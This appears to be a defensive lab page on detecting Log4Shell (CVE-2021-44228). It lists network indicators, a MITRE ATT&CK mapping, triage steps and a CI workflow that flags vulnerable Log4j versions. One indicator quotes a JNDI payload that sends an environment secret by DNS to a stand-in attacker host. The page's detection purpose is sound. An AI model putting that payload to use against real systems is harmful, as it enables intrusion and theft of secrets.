# Lab 6.9: Case Study. Log4Shell (CVE-2021-44228)

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <a href="../analyze/" class="phase-step done">Analyze</a>
  <span class="phase-arrow">›</span>
  <a href="../lessons/" class="phase-step done">Lessons</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Detect</span>
</div>

<div class="no-terminal-notice">Reference material. No terminal needed.</div>

## Finding Log4Shell in the Wild

WAF rules detect JNDI patterns including obfuscation, but new bypasses were discovered daily. The only real fix is upgrading Log4j.

**Key network indicators:**

- Outbound LDAP to non-internal servers (TCP 389, 636, or non-standard ports)
- Outbound RMI connections (TCP 1099)
- DNS queries with encoded data (`${jndi:dns://attacker.com/${env:SECRET}}`)
- Java process spawning shell commands post-exploitation

| Indicator | Description |
|-----------|-------------|
| `java` making outbound LDAP | JNDI lookup triggered by exploit |
| `java` spawning `bash`, `curl`, `wget` | Post-exploitation command execution |
| New `.class` files in `/tmp/` from `java` | Downloaded malicious class from LDAP |
| High DNS query rate from `java` | DNS-based JNDI data exfiltration |

### MITRE ATT&CK Mapping

| Technique | ID | Relevance |
|-----------|-----|-----------|
| **Supply Chain Compromise: Software Supply Chain** | [T1195.002](https://attack.mitre.org/techniques/T1195/002/) | Log4j as a ubiquitous transitive dependency exploited at scale |
| **Exploit Public-Facing Application** | [T1190](https://attack.mitre.org/techniques/T1190/) | JNDI injection via any logged input field |
| **Command and Scripting Interpreter: Unix Shell** | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | Post-exploitation: JNDI loads a malicious Java class that spawns shell commands |

**Alerts:** "JNDI injection pattern detected" (WAF/IDS), "Outbound LDAP from application server" (firewall/NDR), "Java process spawned shell command" (EDR), "DNS query with encoded data" (DNS monitoring).

During the initial response, SOCs were overwhelmed by scanning volume (both attackers and defenders testing). Obfuscation bypasses outpaced WAF rule updates. Focus on **successful exploitation indicators** (outbound LDAP connections, post-exploitation processes) rather than injection attempts.

**Triage steps:**

1. Check if Log4j 2.x (<2.17.1) is in the dependency tree via SBOM
2. Analyze the JNDI callback URL from WAF/IDS logs
3. Check for outbound LDAP/RMI from the app server
4. Check for post-exploitation child processes from java/tomcat
5. If exploited: assume full compromise and isolate

---

### CI Integration

Add this workflow to detect vulnerable Log4j versions in Java projects via SBOM and dependency analysis. Save as `.github/workflows/log4j-check.yml`:

```yaml
name: Log4j Vulnerability Check

on:
  pull_request:
    paths:
      - "pom.xml"
      - "build.gradle*"
      - "gradle.lockfile"
      - "**/pom.xml"
  push:
    branches: [main]
  schedule:
    - cron: "0 6 * * 1"  # Weekly scan

permissions:
  contents: read

jobs:
  check-log4j:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Scan for vulnerable Log4j versions
        run: |
          EXIT_CODE=0
          echo "--- Scanning for Log4j CVE-2021-44228 ---"

          # Check Maven pom.xml files
          for pom in $(find . -name 'pom.xml' 2>/dev/null); do
            if grep -q 'log4j' "$pom"; then
              # Extract version if directly specified
              VERSION=$(grep -A2 'log4j' "$pom" | grep '<version>' | \
                sed 's/.*<version>\(.*\)<\/version>.*/\1/' | head -1 || true)
              if [ -n "$VERSION" ]; then
                echo "Found log4j version $VERSION in $pom"
                # Check if version is vulnerable (< 2.17.1)
                if echo "$VERSION" | grep -qE '^2\.(0|1[0-6]|17\.0)'; then
                  echo "::error file=$pom::Vulnerable Log4j version $VERSION detected."
                  echo "Upgrade to 2.17.1+ immediately."
                  EXIT_CODE=1
                fi
              fi
            fi
          done

          # Check Gradle files
          for gradle in $(find . -name 'build.gradle*' 2>/dev/null); do
            if grep -q 'log4j' "$gradle"; then
              echo "::warning file=$gradle::Log4j dependency found. Verify version >= 2.17.1."
            fi
          done

          if [ "$EXIT_CODE" -eq 0 ]; then
            echo "PASS: No vulnerable Log4j versions detected."
          fi
          exit $EXIT_CODE

      - name: Check for JNDI lookup exposure
        run: |
          # Look for log4j2.xml configs that do not disable lookups
          for cfg in $(find . -name 'log4j2*.xml' -o -name 'log4j2*.properties' 2>/dev/null); do
            if ! grep -q 'log4j2.formatMsgNoLookups=true' "$cfg" 2>/dev/null; then
              echo "::warning file=$cfg::Consider setting log4j2.formatMsgNoLookups=true as defense in depth."
            fi
          done
          echo "JNDI lookup check complete."
```

---

See also: [Detection Rule Library](../../../resources/detection-rules.md) | [CI Security Snippets](../../../resources/ci-snippets.md)

---

## What You Learned

- **Log4Shell was a supply chain vulnerability.** Log4j arrived as a transitive dependency nobody chose. SBOM would have reduced response time from days to minutes.
- **Any logged user input was an RCE vector.** JNDI lookup in a logging library created a nearly universal attack surface.
- **First patches are not always the last.** Four CVEs in three weeks. Fast-path patching and automated deployment are essential.

## Further Reading

- [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
- [CISA: Apache Log4j Vulnerability Guidance](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a)
- [LunaSec: Log4Shell Explained](https://www.lunasec.io/docs/blog/log4j-zero-day/)
